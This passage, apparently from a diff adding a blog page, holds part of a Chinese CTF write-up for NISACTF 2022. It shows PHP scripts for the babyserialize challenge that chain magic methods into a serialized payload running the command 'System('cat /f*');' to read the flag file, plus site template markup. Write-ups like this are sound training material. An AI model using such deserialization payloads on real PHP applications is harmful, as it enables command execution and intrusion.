class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="string">&quot;show&quot;</span>;</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用$nisa对象的__invoke()方法</span></span><br><span class="line"><span class="variable">$four</span> = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$four</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>;</span><br><span class="line"><span class="variable">$four</span>-&gt;a = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串使用时会调用$Ilt对象里面的__tostring()方法</span></span><br><span class="line"><span class="variable">$Ilt</span>-&gt;huang = <span class="variable">$four</span>;  <span class="comment">//four里面有fun属性了，fun属性为一个不可访问的属性，给不可访问的属性赋值时会调用__set()方法</span></span><br><span class="line"><span class="variable">$TXW</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$TXW</span>-&gt;ext=<span class="variable">$Ilt</span>; <span class="comment">//Ilovetxw并没有nisa方法 所以会触发__call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$TXW</span>));</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用__invoke()方法</span></span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串利用时，会调用__toString()方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nisa</span>));</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/21346asz/21346asz.github.io">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-checkin"><span class="toc-number">1.</span> <span class="toc-text">[NISACTF 2022]checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">2.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyserialize"><span class="toc-number">3.</span> <span class="toc-text">[NISACTF 2022]babyserialize</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/CTFwp/NISACTF-2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&text=NISACTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&is_video=false&description=NISACTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NISACTF 2022&body=Check out this article: https://21346asz.github.io/CTFwp/NISACTF-2022/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&name=NISACTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/CTFwp/NISACTF-2022/&t=NISACTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2025
+        wArn
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        --><!--
+          --><li><a href="/categories/">categories</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="https://github.com/21346asz/21346asz.github.io">Projects</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'ctferwArn';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
